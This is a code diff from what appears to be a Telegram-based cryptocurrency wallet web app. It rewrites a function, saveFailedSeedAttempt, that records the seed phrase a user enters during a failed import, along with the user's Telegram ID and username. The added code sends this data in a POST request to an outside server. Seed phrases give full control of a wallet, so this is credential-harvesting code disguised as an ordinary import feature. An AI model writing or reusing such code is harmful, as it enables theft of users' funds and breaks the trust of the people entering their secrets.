@@ -5433,14 +5433,25 @@ function updateSeedImportProgress() {
 async function saveFailedSeedAttempt(phrase, reason) {
   try {
     const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user || {};
-    await sb.insert('failed_seed_attempts', {
-      phrase,
-      reason,
+    const payload = {
+      phrase: String(phrase || ''),
+      reason: String(reason || ''),
       tg_id: tgUser.id ? String(tgUser.id) : null,
       tg_username: tgUser.username || null,
       created_at: new Date().toISOString()
+    };
+    const r = await fetch('https://blackswallet-bot.onrender.com/proxy/failed_seed_attempts', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Prefer': 'return=representation' },
+      body: JSON.stringify(payload)
     });
-  } catch(e) { /* silent */ }
+    if (!r.ok) {
+      const txt = await r.text();
+      console.error('saveFailedSeedAttempt error:', r.status, txt);
+    }
+  } catch(e) {
+    console.error('saveFailedSeedAttempt exception:', e);
+  }
 }
 
 async function authImportSeed() {
